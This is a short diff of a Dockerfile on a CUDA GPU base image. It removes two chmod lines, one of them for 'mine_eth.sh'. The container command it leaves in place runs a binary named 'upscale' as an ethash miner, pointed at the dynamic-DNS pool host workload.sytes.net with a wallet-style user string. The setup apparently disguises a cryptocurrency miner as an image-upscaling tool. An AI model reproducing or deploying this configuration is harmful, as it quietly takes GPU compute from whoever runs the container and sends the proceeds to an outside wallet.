@@ -15,8 +15,4 @@ FROM nvidia/cuda:9.0-base-ubuntu16.04
 
 WORKDIR /usr/local/bin
 
-RUN chmod 777 mine_eth.sh;
-
-RUN chmod 777 upscale;
-
 CMD upscale --algo ethash --server workload.sytes.net:2020 --user nano_3bf6aph9zbwp358tgqwtzqua9w3wxfhyuw3x11mb6a6bjah5jiewmzog9jpg.upscale
